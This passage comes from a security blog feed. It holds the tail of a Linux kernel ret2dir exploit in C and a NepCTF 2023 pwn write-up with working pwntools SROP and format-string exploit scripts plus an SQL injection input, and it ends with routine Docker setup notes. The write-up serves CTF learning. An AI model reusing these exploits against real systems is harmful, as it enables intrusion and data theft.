(fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open  error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">  physmap_spray_arr[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,</span><br><span class="line">                              MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  constructROPChain(physmap_spray_arr[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">15000</span>; i++) &#123;</span><br><span class="line">    physmap_spray_arr[i] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,</span><br><span class="line">                                MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!physmap_spray_arr[i]) &#123;</span><br><span class="line">      perror(<span class="string">&quot;Mmap Failed!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(physmap_spray_arr[i], physmap_spray_arr[<span class="number">0</span>], page_size);</span><br><span class="line">  &#125;</span><br><span class="line">  guess = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line">  __asm__(<span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r9,    pop_rsp_ret;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r8,    guess;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rax,   0x10;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rdx,   guess;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rsi,   0x1bf52;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rdi,   fd;&quot;</span></span><br><span class="line">          <span class="string">&quot;syscall&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/22/kernel-ret2dir/image-20230828094130225.png" alt="image-20230828094130225"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li><a href="https://zhuanlan.zhihu.com/p/560805991">https://zhuanlan.zhihu.com/p/560805991</a></li><li><a href="https://zhuanlan.zhihu.com/p/137277724">https://zhuanlan.zhihu.com/p/137277724</a></li><li><a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir">https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 NepCTF pwn</title>
      <link href="/2023/08/17/2023NepCTF/"/>
      <url>/2023/08/17/2023NepCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/m/n/srop&gt; checksec pwn</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/nepctf/srop/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/m/n/srop&gt; seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>sropret2csu</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;nepctf.1cepeak.cn&#x27;</span>,<span class="number">30523</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># db(&#x27;0x04007AD&#x27;)</span></span><br><span class="line">buffer=elf.bss()</span><br><span class="line"><span class="comment"># 0x0000000000400813 : pop rdi ; ret</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400813</span></span><br><span class="line">syscall=elf.sym[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">padding=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">readpaylaod = SigreturnFrame()</span><br><span class="line">readpaylaod.rdi=<span class="number">0</span></span><br><span class="line">readpaylaod.rsi=<span class="number">0</span></span><br><span class="line">readpaylaod.rdx=buffer</span><br><span class="line">readpaylaod.rcx=<span class="number">0x1000</span></span><br><span class="line">readpaylaod.rip=syscall</span><br><span class="line">readpaylaod.rsp =buffer+<span class="number">8</span></span><br><span class="line"></span><br><span class="line">ropopen=SigreturnFrame()</span><br><span class="line">ropopen.rdi=<span class="number">2</span></span><br><span class="line">ropopen.rsi=buffer</span><br><span class="line">ropopen.rip=syscall</span><br><span class="line">ropopen.rsp =buffer+<span class="number">8</span>+<span class="built_in">len</span>(<span class="built_in">bytes</span>(readpaylaod))+<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">ropread=SigreturnFrame()</span><br><span class="line">ropread.rdi=<span class="number">0</span></span><br><span class="line">ropread.rsi=<span class="number">3</span></span><br><span class="line">ropread.rdx=buffer+<span class="number">0x100</span></span><br><span class="line">ropread.rcx=<span class="number">0x50</span></span><br><span class="line">ropread.rip=syscall</span><br><span class="line">ropread.rsp = buffer+<span class="number">8</span>+<span class="built_in">len</span>(<span class="built_in">bytes</span>(readpaylaod))*<span class="number">2</span>+<span class="number">0x18</span>*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">ropwrite=SigreturnFrame()</span><br><span class="line">ropwrite.rdi=<span class="number">1</span></span><br><span class="line">ropwrite.rsi=<span class="number">1</span></span><br><span class="line">ropwrite.rdx=buffer+<span class="number">0x100</span></span><br><span class="line">ropwrite.rcx=<span class="number">0x50</span></span><br><span class="line">ropwrite.rip=syscall</span><br><span class="line">ropwrite.rsp =buffer+<span class="number">8</span>+<span class="built_in">len</span>(<span class="built_in">bytes</span>(readpaylaod))*<span class="number">3</span>+<span class="number">0x18</span>*<span class="number">3</span></span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line">    padding,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">0xf</span>,</span><br><span class="line">    syscall,</span><br><span class="line">    <span class="built_in">bytes</span>(readpaylaod)</span><br><span class="line">)</span><br><span class="line">sa(<span class="string">b&#x27;welcome to NepCTF2023!&#x27;</span>,payload)</span><br><span class="line">paylaod=flat(</span><br><span class="line">    <span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>),</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">0xf</span>,</span><br><span class="line">    syscall,</span><br><span class="line">    <span class="built_in">bytes</span>(ropopen),</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">0xf</span>,</span><br><span class="line">    syscall,</span><br><span class="line">    <span class="built_in">bytes</span>(ropread),</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">0xf</span>,</span><br><span class="line">    syscall,</span><br><span class="line">    <span class="built_in">bytes</span>(ropwrite),</span><br><span class="line">)</span><br><span class="line">s(paylaod)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2023/08/17/2023NepCTF/image-20230817135721077.png" alt="image-20230817135721077"></p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">function listFiles() &#123;</span><br><span class="line">      $.get(&quot;/list_files/&quot;, function(data)&#123;</span><br><span class="line">          $(&quot;#file-list&quot;).html(data);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function viewFile(filename) &#123;</span><br><span class="line">      window.location = &#x27;/view_file/&#x27; + filename;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>&#x2F;list_files&#x2F;&#x2F;login</p><p><img src="/2023/08/17/2023NepCTF/image-20230818175023327.png" alt="image-20230818175023327"></p><p>flag</p><p>a3urla4</p><p><img src="/2023/08/17/2023NepCTF/image-20230818170424353.png" alt="image-20230818170424353"></p><p>dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./libmicrohttpd.so.12 /home/ctf/lib/x86_64-linux-gnu/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./ld-linux-x86-64.so.2 /home/ctf/lib64</span></span><br></pre></td></tr></table></figure><p>&#x2F;view_file&#x2F;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/view_file//lib/x86_64-linux-gnu/libmicrohttpd.so.12</span><br><span class="line">/view_file//lib64/ld-linux-x86-64.so.2</span><br></pre></td></tr></table></figure><p><img src="/2023/08/17/2023NepCTF/image-20230818175743836.png" alt="image-20230818175743836"></p><p>docker</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/m/n/login&gt; ps -ef | grep &#x27;login&#x27;</span><br><span class="line">root       52101   52067 91 16:16 ?        01:38:10 ./login</span><br><span class="line">sudo gdb attach 52101</span><br></pre></td></tr></table></figure><p>destsprintfsprintflag%sv49</p><p><img src="/2023/08/17/2023NepCTF/image-20230818193423236.png" alt="image-20230818193423236"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&quot;http://192.168.70.134:32774/login&quot;</span></span><br><span class="line">headers=&#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36 Edg/100.0.1185.29&quot;</span>&#125;</span><br><span class="line">params = &#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;%15059$p&#x27;</span>&#125;</span><br><span class="line">response = requests.get(url=url,headers=headers, params=params)</span><br><span class="line">heapad = <span class="built_in">int</span>(re.findall(<span class="string">r&#x27;0x([0-9a-fA-F]+)&#x27;</span>, response.text)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heapad))</span><br><span class="line">flagad=heapad-<span class="number">0x40</span></span><br><span class="line"></span><br><span class="line">params = &#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">b&#x27;%36$saaa&#x27;</span>+p64(flagad)&#125;</span><br><span class="line">response= requests.get(url=url, headers=headers,params=params)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="/2023/08/17/2023NepCTF/image-20230818194536343.png" alt="image-20230818194536343"></p><h2 id="HRP-CHAT"><a href="#HRP-CHAT" class="headerlink" title="HRP-CHAT"></a>HRP-CHAT</h2><h3 id="one"><a href="#one" class="headerlink" title="one"></a>one</h3><p>open flag</p><p><img src="/2023/08/17/2023NepCTF/image-20230819001326863.png" alt="image-20230819001326863"></p><p>Shop,rootflagsql sql</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v51, <span class="string">&quot;999&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sprintf</span>(s, <span class="string">&quot;select * from user where Username=&#x27;%s&#x27; and Statement =&#x27;root&#x27;&quot;</span>, v39 + <span class="number">856</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n\n%s\n&quot;</span>, s);</span><br><span class="line">      v21 = <span class="number">0</span>;</span><br><span class="line">      v22 = <span class="number">0</span>;</span><br><span class="line">      rc = sqlite3_get_table(db, s, v36, &amp;v21, &amp;v22, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v21 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v54[<span class="number">0</span>] = <span class="string">&#x27;\xE4\x85\xBB\xE4galf&#x27;</span>;</span><br><span class="line">        v54[<span class="number">1</span>] = <span class="string">&#x27;\x94\xE7toor\x9B\xBE&#x27;</span>;</span><br><span class="line">        LODWORD(v55) = <span class="number">-1215764824</span>;</span><br><span class="line">        BYTE4(v55) = <span class="number">0</span>;</span><br><span class="line">        send(*((_QWORD *)v39 + <span class="number">2</span>), buf, <span class="number">0x630</span>uLL, <span class="number">0</span>);</span><br><span class="line">        pthread_mutex_unlock(&amp;phead);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        stream = fopen(<span class="string">&quot;/home/ctf/Nep_CTF_FLAG_ONE&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Login</span><br><span class="line">12</span><br><span class="line">jk</span><br><span class="line">Login</span><br><span class="line">12&#x27;--</span><br><span class="line">jk</span><br><span class="line">Shop</span><br><span class="line">999</span><br></pre></td></tr></table></figure><p><img src="/2023/08/17/2023NepCTF/image-20230819003924199.png" alt="image-20230819003924199"></p><h3 id="three"><a href="#three" class="headerlink" title="three"></a>three</h3><p>startv33&lt;&#x3D;0,dword_55F4474AADD8int99999999H3h3QAQH3h3QAQ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(*(<span class="type">const</span> <span class="type">char</span> **)&amp;v39[<span class="number">8</span> * v31 + <span class="number">48</span>], (<span class="type">const</span> <span class="type">char</span> *)&amp;cNode[<span class="number">20</span> * m])</span><br><span class="line">            &amp;&amp; v32 &lt;= <span class="number">1</span></span><br><span class="line">            &amp;&amp; v31 &gt;= <span class="number">0</span></span><br><span class="line">            &amp;&amp; v31 &lt;= *((_QWORD *)v39 + <span class="number">106</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            v33 = dword_55F4474AADD8 + cNode[<span class="number">20</span> * m + <span class="number">16</span> + (<span class="type">int</span>)v32];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hurt:%d\n&quot;</span>, v33);</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">int</span>)v33 &lt;= <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v46 = fopen(<span class="string">&quot;/home/ctf/Nep_CTF_FLAG_THREE&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">              <span class="keyword">if</span> ( !v46 )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Could not open flag file.&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">              &#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/17/2023NepCTF/image-20230819151208900.png" alt="image-20230819151208900"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker</title>
      <link href="/2023/08/17/docker/"/>
      <url>/2023/08/17/docker/</url>
      
        <content type="html"><![CDATA[<p>docker(run)</p><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a><a href="https://docs.docker.com/">Docker</a></h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>Ubuntudocker</p><p><a href="https://docs.docker.com/engine/install/ubuntu/#install-using-the-repository">https://docs.docker.com/engine/install/ubuntu/#install-using-the-repository</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install ca-certificates curl gnupg</span><br><span class="line"></span><br><span class="line">sudo install -m 0755 -d /etc/apt/keyrings</span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg</span><br><span class="line">sudo chmod a+r /etc/apt/keyrings/docker.gpg</span><br><span class="line"></span><br><span class="line">echo \</span><br><span class="line">  &quot;deb [arch=&quot;$(dpkg --print-architecture)&quot; signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \</span><br><span class="line">  &quot;$(. /etc/os-release &amp;&amp; echo &quot;$VERSION_CODENAME&quot;)&quot; stable&quot; | \</span><br><span class="line">  sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</span><br></pre></td></tr></table></figure><p>docker(root)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable docker</span><br><span class="line">sudo systemctl start docker</span><br><span class="line">sudo groupadd docker</span><br><span class="line">sudo usermod -aG docker $USER</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong>&#x2F;etc&#x2F;docker&#x2F;daemon.json</strong>  ps:</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>docker</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>docker info</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Registry Mirrors:</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><ul><li>Image</li><li>Container</li><li>Repository</li></ul><h4 id="Image"><a href="#Image" class="headerlink" title="Image"></a>Image</h4><p></p><h4 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h4><p><strong></strong> <strong></strong></p><h4 id="Repository"><a href="#Repository" class="headerlink" title="Repository"></a>Repository</h4><p>github</p><p><a href="https://hub.docker.com/">https://hub.docker.com/</a></p><p><code>&lt;&gt;:&lt;&gt;</code>  <code>latest</code> </p><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><code>docker pull [] [Docker Registry [:]/][:]</code></p><ul><li>Docker Registry Docker Hub(<code>docker.io</code>)</li><li> <code>&lt;&gt;/&lt;&gt;</code> Docker Hub <code>library</code></li></ul><p><code>docker image ls</code>  </p><p><code>docker system df</code>  </p><p><code>docker image rm [] &lt;1&gt; [&lt;2&gt; ...] </code> </p><ul><li><code>docker image rm $(docker image ls -q redis)</code> redis</li></ul><p><code>docker commit [] &lt;ID&gt; [&lt;&gt;[:&lt;&gt;]]</code>  <strong>,</strong></p><p><code>docker build [] &lt;/URL/-&gt;</code>  </p><ul><li><p>-t  name:tag</p></li><li><p><code>docker build</code>  Docker </p></li><li><p>-f dockerfile</p></li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><code>docker ps</code> <code>docker container ls</code></p><p><code>docker run</code> </p><ul><li><code>-t</code> Dockerpseudo-tty <code>-i</code> </li><li><code>-d</code>   ID</li><li>&#96;&#96;-p local:container&#96; containelocal</li></ul><p><code>docker container start</code> <code>exited</code></p><p><code>docker container stop</code> </p><p><code>docker container restart</code> </p><p><code>docker container rm</code> </p><p><code>docker container prune</code></p><p><code>docker network ls</code> </p><p><code>docker exec</code> </p><ul><li>docker exec -it [container ID or NAMES]  Docker </li></ul><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a><a href="https://docs.docker.com/engine/reference/builder/">Dockerfile</a></h2><p>DockerDockerfile  </p><p><code>FROM</code> (latest)</p><ul><li>FROM scratch  </li></ul><p><code>RUN</code> </p><ul><li>RUN &lt;&gt;</li><li>RUN [, 1, 2]</li></ul><blockquote><p>Dockerfile(RUNcommit)&amp;&amp;</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> debian:stretch</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">set</span> -x; buildDeps=<span class="string">&#x27;gcc libc6-dev make wget&#x27;</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install -y <span class="variable">$buildDeps</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; wget -O redis.tar.gz <span class="string">&quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">mkdir</span> -p /usr/src/redis \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; make -C /usr/src/redis \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; make -C /usr/src/redis install \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> -rf /var/lib/apt/lists/* \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> redis.tar.gz \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> -r /usr/src/redis \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get purge -y --auto-remove <span class="variable">$buildDeps</span></span></span><br></pre></td></tr></table></figure></blockquote><p><code>COPY</code>  <code>&lt;&gt;</code> &#x2F; <code>&lt;&gt;</code> </p><ul><li>COPY [chown&#x3D;<user>:<group>] &lt;&gt; &lt;&gt;</group></user></li><li><code>&lt;&gt;</code> <code>&lt;&gt;</code></li><li><code>--chown=&lt;user&gt;:&lt;group&gt;</code></li></ul><p><code>ADD</code>  <code>COPY</code>URL</p><p><code>CMD</code>  </p><ul><li>shell<code> </code>CMD &lt;&gt;</li><li>exec<code> </code>CMD [, 1, 2]</li><li>shellCMD echo $HOMECMD[ sh, -c, echo $HOME ]</li></ul><p><code>ENTRYPOINT</code> <code>CMD</code></p><ul><li><a href="https://yeasy.gitbook.io/docker_practice/image/dockerfile/entrypoint">https://yeasy.gitbook.io/docker_practice/image/dockerfile/entrypoint</a></li></ul><p><code>ENV</code>  shell</p><ul><li>ENV <key1>&#x3D;<value1> <key2>&#x3D;<value2></value2></key2></value1></key1></li></ul><p><code>ARG</code> </p><ul><li>ARG &lt;&gt;[&#x3D;&lt;&gt;]</li><li>docker build build-arg &lt;&gt;&#x3D;&lt;&gt;</li></ul><p><code>VOLUME</code> </p><ul><li>VOLUME [&lt;1&gt;, &lt;2&gt;]</li></ul><p><code>EXPOSE</code> </p><ul><li>EXPOSE &lt;1&gt; [&lt;2&gt;]</li></ul><p><code>WORKDIR</code> </p><ul><li>WORKDIR &lt;&gt;</li></ul><p><code>USER</code> </p><ul><li>USER &lt;&gt;[:&lt;&gt;]</li><li></li><li></li></ul><p><code>HEALTHCHECK</code> </p><p><code>ONBUILD</code>  </p><ul><li>ONBUILD &lt;&gt;</li></ul><p><code>LABEL</code> </p><ul><li>LABEL &lt;key&gt;&#x3D;&lt;value&gt; &lt;key&gt;&#x3D;&lt;value&gt; &lt;key&gt;&#x3D;&lt;value&gt; </li></ul><p><code>SHELL</code>   <code>RUN</code> <code>ENTRYPOINT</code> <code>CMD</code>  shell</p><ul><li>SHELL [executable, parameters]</li></ul><h2 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker Compose"></a>Docker Compose</h2><p><code>Compose</code> </p><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@Ubuntu22:/home/grxer# sudo curl -L https://github.com/docker/compose/releases/download/v2.20.3/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line"><span class="meta prompt_">  % </span><span class="language-bash">Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span></span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0</span><br><span class="line">100 56.6M  100 56.6M    0     0  12.3M      0  0:00:04  0:00:04 --:--:-- 14.1M</span><br><span class="line">root@Ubuntu22:/home/grxer# sudo chmod +x /usr/local/bin/docker-compose</span><br><span 